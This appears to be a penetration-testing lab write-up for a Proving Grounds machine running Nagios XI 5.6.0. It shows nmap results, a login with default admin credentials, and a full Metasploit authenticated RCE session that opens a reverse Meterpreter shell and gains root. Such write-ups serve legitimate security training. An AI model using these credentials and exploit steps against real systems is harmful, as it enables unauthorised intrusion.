---
title: "Proving grounds Play: Monitoring"
layout: post
date: 2023-09-25 03:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b88c40f65f2a8bf792a8814bbb596d02 (RSA)
|   256 e7bb11c12ecd3991684eaa01f6dee619 (ECDSA)
|_  256 0f8e28a7b71d60bfa62bdda36dd14ea4 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-08T17:59:00
| Not valid after:  2030-09-06T17:59:00
| MD5:   e0671ea392c2ec73cb21de0e73dfcb66
|_SHA-1: e39cc9b6c35bb6083dd0cd25e60fcb616551da77
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8E1494DD4BFF0FC523A2E2A15ED59D84
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
_http-title: Nagios XI
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Issuer: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-09-08T18:28:08
| Not valid after:  2030-09-06T18:28:08
| MD5:   20f0951f8eff1b69ef3f1b1efb4c361f
|_SHA-1: cc400ad760cf49591c92d9ab0f06106c18f66661
```

## Web PORT: 80

![img](/assets/images/CTF/Proving_Grounds/Monitoring/web.png)

The port 80 is restricting the users from logging into the admin dashboard.

```text
NSP: Sorry Dave, I can't let you do that
```

## Web PORT: 443

![img](/assets/images/CTF/Proving_Grounds/Monitoring/web.png)

Use credentials `nagiosadmin:admin` to login to the portal. The Nagios XI 5.6.0 is vulnerable to authenticated remote code execution. The foothold can be acheived by using the metasploit module.

## Foothold

```sh
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set password admin
password => admin
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set lhost 192.168.45.233
lhost => 192.168.45.233
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set RHOSTS 192.168.167.136
RHOSTS => 192.168.167.136
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set RPORT 443
RPORT => 443
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/nagios_xi_plugins_check_plugin_authenticated_rce) > run

[*] Started reverse TCP handler on 192.168.45.233:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI
[*] Target is Nagios XI with version 5.6.0
[+] The target appears to be vulnerable.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting up to 300 seconds for the plugin to request the final payload...
[*] Sending stage (3045348 bytes) to 192.168.167.136
[*] Meterpreter session 1 opened (192.168.45.233:4444 -> 192.168.167.136:51442) at 2023-09-25 07:06:23 -0400
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > shell
whoami
root
```

**Foothold Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).